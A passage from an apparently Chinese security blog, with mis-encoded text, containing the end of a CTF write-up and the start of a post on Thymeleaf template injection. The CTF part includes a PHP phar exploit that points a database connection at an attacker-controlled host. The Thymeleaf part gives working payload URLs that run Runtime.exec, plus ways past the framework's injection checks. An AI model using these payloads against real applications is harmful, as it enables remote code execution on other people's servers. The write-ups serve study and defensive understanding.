&#x27;Test&#x27;);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM das&quot;</span>;<br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>    <br><span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <br><span class="hljs-comment">// è·å–ç»“æœ</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$result</span>);<br><br></code></pre></td></tr></table></figure><p>è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241226212228136.png" alt="image-20241226212228136"></p><p>æœ€åçš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241226212501441.png" alt="image-20241226212501441"></p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯gxnå¤§å“¥çš„æ•°å­—å†™é”™äº†ï¼Œå› ä¸º<code>FETCH_CLASSTYPE</code>çš„æ•°å­—å¹¶ä¸æ˜¯262152ï¼Œç„¶åæˆ‘å°±åªè®¾ç½®äº†FETCH_CLASSTYPEè¿™ä¸ªå±æ€§ï¼Œä½†æ˜¯å‘ç°ä»–ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDOException: SQLSTATE[HY000]: General error: PDO::FETCH_CLASSTYPE can only be used together with PDO::FETCH_CLASS<br></code></pre></td></tr></table></figure><p>è¯´è¿˜éœ€è¦é…åˆ<code>FETCH_CLASS</code>ä½¿ç”¨ï¼Œç„¶åå†å»æ‰¾ä¸€ä¸‹è¿™ä¸ªå±æ€§</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Specifies that the fetch method shall return a new instance of the</span><br><span class="hljs-comment">     * requested class, mapping the columns to named properties in the class.</span><br><span class="hljs-comment">     * The magic</span><br><span class="hljs-comment">     * &lt;b&gt;__set&lt;/b&gt;</span><br><span class="hljs-comment">     * method is called if the property doesn&#x27;t exist in the requested class</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-class</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASS</span> = <span class="hljs-number">8</span>;<br></code></pre></td></tr></table></figure><p>å¤§ä½“æ„æ€å°±æ˜¯è¯´ï¼Œfetchæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ï¼Œç„¶åå°†åˆ—æ˜ å°„åˆ°å‘½åå±æ€§ä¸Šé¢ï¼Œå¦‚æœè¯·æ±‚çš„ç±»ä¸å­˜åœ¨è¯¥å±æ€§ï¼Œåˆ™è°ƒç”¨__setæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªæ‰æ˜¯æœ€å…³é”®çš„å±æ€§ï¼Œç„¶åFETCH_CLASSTYPEç›¸å½“äºæŒ‡å®šäº†ç±»çš„åå­—ï¼Œæœ‰ç‚¹ç±»ä¼¼è¿‡æ»¤å™¨çš„æ„æ€äº†ï¼Œç„¶åä»–ä»¬ä¸¤ä¸ªçš„å€¼æˆ–å‡ºæ¥ 8 | 262144 &#x3D; 262152ï¼Œåˆšå¥½å°±æ˜¯262152ã€‚ï¼ˆè¿™é‡Œçœ‹äº†æˆ‘åŠå¤©çœŸçš„ğŸ˜­ï¼‰</p><p>æ‰€ä»¥è¿™ä¹ˆå†™ä¹Ÿæ˜¯å¯ä»¥çš„</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>,<span class="hljs-number">262152</span>);<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è¿™é‡Œå°±æ˜¯å¯ä»¥ç„¶åæ•°æ®åº“è¿”å›UserMessageå¯¹è±¡ï¼Œè®¾ç½®filePathçš„å€¼ï¼Œå†æ·»åŠ ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§å³å¯ï¼Œæ•°æ®åº“çš„ç»“æ„å¦‚ä¸‹ï¼Œç›´æ¥å·gxnå¤§å“¥çš„å›¾äº†</p><p><img src="https://cdn.clown2024.cn/image-20241226214745079.png" alt="image-20241226214745079"></p><p>æœ€åçš„expå°±æ˜¯gxnå¤§å“¥çš„exp</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;UserMessage&quot;</span>;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;aaaa&quot;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$created_at</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br><br>     <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();;<br><br>  &#125;<br><br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br><br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = <span class="hljs-keyword">array</span>(<br><br>     <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=&lt;vps&gt;:3306;dbname=&lt;dbname&gt;;charset=utf8&quot;</span>,<br><br>     <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;&lt;vps&gt;&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br><br>      <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br><br>     <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;<span class="hljs-number">262152</span>,<br><br>       PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br><br>  );<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;happy.txt&quot;</span>, <span class="hljs-string">&#x27;happy&#x27;</span>); <br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-variable">$file_contents</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;ppppp.phar&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_contents</span>));<br></code></pre></td></tr></table></figure><p>è¿™é‡Œbuué¶æœºç»´æŠ¤äº†ï¼Œæœ¬åœ°ä¸å¤ªå¥½æµ‹ï¼Œä½†æ‰“æ³•å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œå°±åˆ°è¿™å§ï¼Œå­¦ä¹ åˆ°äº†orz</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD</a></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†çœ‹Thymeleaf</title>
      <link href="/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/"/>
      <url>/2024/12/14/%E5%86%8D%E7%9C%8BThymeleaf/</url>
      
        <content type="html"><![CDATA[<p>å†æ¥æ°´ä¸€ç¯‡Thymeleafçš„sstiï¼Œèµ·å› æ˜¯çœ‹åˆ°å¸ˆå…„ä»¥å‰å‡ºçš„é¢˜ç›®ï¼Œé‡Œé¢æœ‰ä¸€ç‚¹å°å‘ï¼Œç´¢å¼•å°±æŠŠThymeleafç¨å¾®é«˜ç‰ˆæœ¬ä¸€äº›çš„æ¼æ´å†è®°å½•ä¸€ä¸‹</p><h1 id="thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨"><a href="#thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨"></a>thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨</h1><p>ä¸Šä¸€ç¯‡æ–‡ç« åªè¯´äº†3.0.11ç‰ˆæœ¬ä¹‹å‰çš„åˆ©ç”¨ï¼Œåå‡ ä¸ªç‰ˆæœ¬çš„åˆ©ç”¨æ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œè®°å½•ä¸€ä¸‹</p><p>thymeleafå’Œspringbootå¯¹åº”çš„ç‰ˆæœ¬</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">SpringBoot     Thymeleaf<br>2.2.0.RELEASE  3.0.11<br>2.4.10         3.0.12<br>2.7.18         3.0.15<br>3.0.8          3.1.1<br>3.2.2          3.1.2<br></code></pre></td></tr></table></figure><h2 id="3012ç‰ˆæœ¬åˆ©ç”¨"><a href="#3-0-12ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="3.0.12ç‰ˆæœ¬åˆ©ç”¨"></a>3.0.12ç‰ˆæœ¬åˆ©ç”¨</h2><p>æ‰“ä¸€ä¸‹åŸæ¥çš„payloadçœ‹çœ‹æŠ¥é”™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214152746494.png" alt="image-20241214152746494"></p><p>å¯ä»¥çœ‹åˆ°ä»–è¯†åˆ«å‡ºäº†è¡¨è¾¾å¼å¹¶ç¦æ­¢äº†è¡¨è¾¾å¼æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ä»è°ƒç”¨å †æ ˆçœ‹åˆ°ä»–æŠ¥é”™çš„åœ°æ–¹ï¼Œåœ¨SpringRequestUtils.checkViewNameNotInRequestå‡½æ•°é‡Œé¢ï¼Œè¿™æ˜¯åœ¨ThymeleafView#renderFragmenté‡Œé¢æ–°å¢çš„å¤„ç†æ–¹æ³•ï¼Œæˆ‘ä»¬å»çœ‹çœ‹ï¼Œå…¶æºç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkViewNameNotInRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String viewName, <span class="hljs-keyword">final</span> HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">vn</span> <span class="hljs-operator">=</span> StringUtils.pack(viewName);<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">requestURI</span> <span class="hljs-operator">=</span> StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">found</span> <span class="hljs-operator">=</span> (requestURI != <span class="hljs-literal">null</span> &amp;&amp; requestURI.contains(vn));<br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            <span class="hljs-keyword">final</span> Enumeration&lt;String&gt; paramNames = request.getParameterNames();<br>            String[] paramValues;<br>            String paramValue;<br>            <span class="hljs-keyword">while</span> (!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>                paramValues = request.getParameterValues(paramNames.nextElement());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; i++) &#123;<br>                    paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                    <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;<br>                        found = <span class="hljs-literal">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateProcessingException</span>(<br>                    <span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in &quot;</span> +<br>                    <span class="hljs-string">&quot;request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>        &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒè¯•çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241214153327162.png" alt="image-20241214153327162"></p><p>è¿™é‡Œå¦‚æœç»è¿‡å¤„ç†åçš„requestURIåŒ…å«vnï¼Œå°±ä¼šåœ¨ä¸‹é¢æŠ›å‡ºå¼‚å¸¸</p><p><code>StringUtils.pack()</code> çš„ä½œç”¨æ˜¯å»æ‰å­—ç¬¦ä¸²çš„ç©ºæ ¼å’Œ <code>ASCII</code> ç åœ¨ç©ºæ ¼ä¹‹å‰çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå¹¶æœ€åè½¬ä¸ºå°å†™ã€‚ç„¶åå°±æ˜¯å…ˆçœ‹ <code>uri</code> ä¸­æ˜¯å¦å­˜åœ¨ <code>viewName</code> ï¼ˆè¿™ä¸€æ­¥æ˜¯ä¸ºäº†æ£€æŸ¥ <code>restful</code> é£æ ¼çš„å‚æ•°æ˜¯å¦åŒ…å«äº† <code>viewName</code> ï¼‰ï¼Œç„¶åéå† <code>url</code> ä¸­çš„å‚æ•°ï¼ˆ <code>?key=value</code> çš„éƒ¨åˆ† ï¼‰æ˜¯å¦åŒ…å«äº† <code>viewName</code> ï¼ˆè¿™ä¸€æ­¥æ£€æŸ¥çš„æ˜¯æ™®é€šçš„å‚æ•°ï¼‰ï¼Œå¦‚æœä¸Šè¿°ä»»æ„å…¶ä¸€åŒ…å«äº† <code>vn</code> å°±æŠ¥é”™ã€‚æ­£å¯¹åº”è¿™ä¸ªæ–¹æ³•åï¼Œæ£€æŸ¥ <code>viewName</code> æ˜¯å¦åœ¨ <code>request</code> å¯¹è±¡ä¸­ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œç”¨çš„æ˜¯ä¼ è·¯å¾„é‚£ä¸ªdemoå¯¼è‡´ifåˆ¤æ–­éƒ½æ²¡è¿›å»å°±æŠ¥é”™äº†</p><p>æ‰€ä»¥è¿™ç§åœºæ™¯ä¸‹çš„sstiå°±è¢«é˜²å¾¡ä½äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>        <span class="hljs-comment">//returns void, so view name is taken from URI</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>ä½†ä¸‹é¢è¿™ç§æ‹¼æ¥çš„åœºæ™¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒè¯•æ¥çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241214155011988.png" alt="image-20241214155011988"></p><p>è¿™é‡Œçš„è·¯ç”±å°±æ— æ³•åŒ…å«è§†å›¾åäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›å…¥åˆ°ifåˆ¤æ–­é‡Œé¢</p><p>ç„¶åå¯¹æˆ‘ä»¬çš„å‚æ•°å€¼è¿›è¡Œå¤„ç†ï¼Œç”¨UriEscape.unescapeUriQueryParamæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241214155518722.png" alt="image-20241214155518722"></p><p>ä½†ç»è¿‡å¤„ç†ä¹‹åä¾æ—§æ˜¯ä¸ä¼šåŒ…å«vnçš„</p><p><img src="https://cdn.clown2024.cn/image-20241214155957921.png" alt="image-20241214155957921"></p><p>æ‰€ä»¥checkViewNameNotInRequestå°±å·²ç»ç»•è¿‡äº†ï¼Œè¿™ç§åœºæ™¯å¹¶ä¸éœ€è¦æˆ‘ä»¬æ”¹payloadï¼Œç”¨åŸæ¥çš„å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/path?lang=__$%7bT(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()%7d__::.x<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å¦ä¸€ç§æ‹¼æ¥çš„åœºæ™¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc1/&#123;data&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo4</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String data)</span> &#123;<br>    System.out.println(data);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;clown/&quot;</span> + data;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„pocæ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/doc1/;/__$%7BT(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)%7D__::<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç»•è¿‡åŸç†å’Œtomcatçš„urlè§£æç‰¹æ€§ç›¸å…³ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¸èƒ½è®©è§†å›¾çš„åå­—å’Œ path ä¸€è‡´ï¼Œç›¸å…³åŸç†è¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œçœ‹çœ‹ç½‘ä¸Šçš„æ–‡ç« å°±å¥½ï¼Œç»•è¿‡çš„æ–¹å¼é™¤äº†ä¸Šé¢çš„å†™æ³•è¿˜æœ‰ä¸‹é¢å‡ ç§</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/doc1//<br>/doc1;/<br>/doc1/;/<br></code></pre></td></tr></table></figure><p>è¯¥ç‰¹æ€§ä¹Ÿå¯ä»¥ç”¨åœ¨ä¸€äº›æƒé™ç»•è¿‡ä¸Šé¢</p><p>ä½†å…¶å®ä¸Šé¢çš„payloadè¿˜æ˜¯æ‰“ä¸é€šï¼Œæˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·ä¸€ä¸ªé”™è¯¯</p><p><img src="https://cdn.clown2024.cn/image-20241214162453416.png" alt="image-20241214162453416"></p><p>ç›´æ¥è¯´æˆ‘ä»¬template nameä¸åˆæ³•äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢</p><p>è¿™æ˜¯å› ä¸ºåé¢è¿˜æœ‰æ–°å¢çš„ <code>SpringStandardExpressionUtils</code>ç±» çš„æ£€æŸ¥ï¼Œè°ƒç”¨containsSpELInstantiationOrStaticæ–¹æ³•æ£€æŸ¥æˆ‘ä»¬çš„è¡¨è¾¾å¼</p><p><img src="https://cdn.clown2024.cn/image-20241214163751121.png" alt="image-20241214163751121"></p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsSpELInstantiationOrStatic</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String expression)</span> &#123;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * Checks whether the expression contains instantiation of objects (&quot;new SomeClass&quot;) or makes use of</span><br><span class="hljs-comment">         * static methods (&quot;T(SomeClass)&quot;) as both are forbidden in certain contexts in restricted mode.</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">explen</span> <span class="hljs-operator">=</span> expression.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> explen;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ni</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// index for computing position in the NEW_ARRAY</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">si</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">char</span> c;<br>        <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br><br>            c = expression.charAt(n);<br><br>            <span class="hljs-comment">// When checking for the &quot;new&quot; keyword, we need to identify that it is not a part of a larger</span><br>            <span class="hljs-comment">// identifier, i.e. there is whitespace after it and no character that might be a part of an</span><br>            <span class="hljs-comment">// identifier before it.</span><br>            <span class="hljs-keyword">if</span> (ni &lt; NEW_LEN<br>                    &amp;&amp; c == NEW_ARRAY[ni]<br>                    &amp;&amp; (ni &gt; <span class="hljs-number">0</span> || ((n + <span class="hljs-number">1</span> &lt; explen) &amp;&amp; Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>))))) &#123;<br>                ni++;<br>                <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// we found an object instantiation</span><br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// We &#x27;restart&#x27; the matching counter just in case we had a partial match</span><br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    <span class="hljs-comment">// This has to be restarted too</span><br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            ni = <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                si = n;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span><br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span>) &amp;&amp; (expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span>))<br>                        &amp;&amp; ((n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>) || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !(Character.isJavaIdentifierPart(c) || c == <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                si = -<span class="hljs-number">1</span>;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸»è¦é€»è¾‘æ˜¯é¦–å…ˆå€’åºæ£€æµ‹æ˜¯å¦åŒ…å« <code>wen</code>å…³é”®å­—ã€åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦æ˜¯å¦æ˜¯<code>T</code>ï¼Œå¦‚åŒ…å«ï¼Œé‚£ä¹ˆè®¤ä¸ºæ‰¾åˆ°äº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿”å›<code>true</code>ï¼Œé˜»æ­¢è¯¥è¡¨è¾¾å¼çš„æ‰§è¡Œã€‚</p><p>å› æ­¤è¦ç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œåªè¦æ»¡è¶³ä¸‰ç‚¹ï¼š</p><ol><li>è¡¨è¾¾å¼ä¸­ä¸èƒ½å«æœ‰å…³é”®å­—<code>new</code>(å› ä¸ºwenå€’å™è¿‡æ¥å°±æ˜¯newäº†)</li><li>åœ¨<code>(</code>çš„å·¦è¾¹çš„å­—ç¬¦ä¸èƒ½æ˜¯<code>T</code></li><li>ä¸èƒ½åœ¨<code>T</code>å’Œ<code>(</code>ä¸­é—´æ·»åŠ çš„å­—ç¬¦ä½¿å¾—åŸè¡¨è¾¾å¼å‡ºç°é—®é¢˜</li></ol><p>è¿™é‡Œåœ¨ <code>T</code> å’Œ <code>(</code> ä¹‹é—´åŠ ä¸Šç©ºæ ¼ <code>%20</code> å°±å¯ä»¥ç»•è¿‡ï¼Œå…¶ä½™è¿˜æœ‰å¾ˆå¤šå­—ç¬¦éƒ½å¯ä»¥ã€‚ä¾‹å¦‚æ¢è¡Œç¬¦ <code>%0a</code> ï¼Œåˆ¶è¡¨ç¬¦ <code>%09</code> ã€‚</p><p>newçš„ç»•è¿‡å¯ä»¥åœ¨newåé¢åŠ ä¸ª.ä¹Ÿèƒ½è§£ææ¥ç»•è¿‡ï¼Œæˆ–è€…ç”¨å‰é¢æ–‡ç« è¯´è¿‡çš„åå°„æ¥ç»•è¿‡ï¼Œæˆ–è€…å¤§å°å†™ä¹Ÿèƒ½ç»•è¿‡</p><p><img src="https://cdn.clown2024.cn/image-20241214170720029.png" alt="image-20241214170720029"></p><h2 id="3014ç‰ˆæœ¬åˆ©ç”¨"><a href="#3-0-14ç‰ˆæœ¬åˆ©ç”¨" class="headerlink" 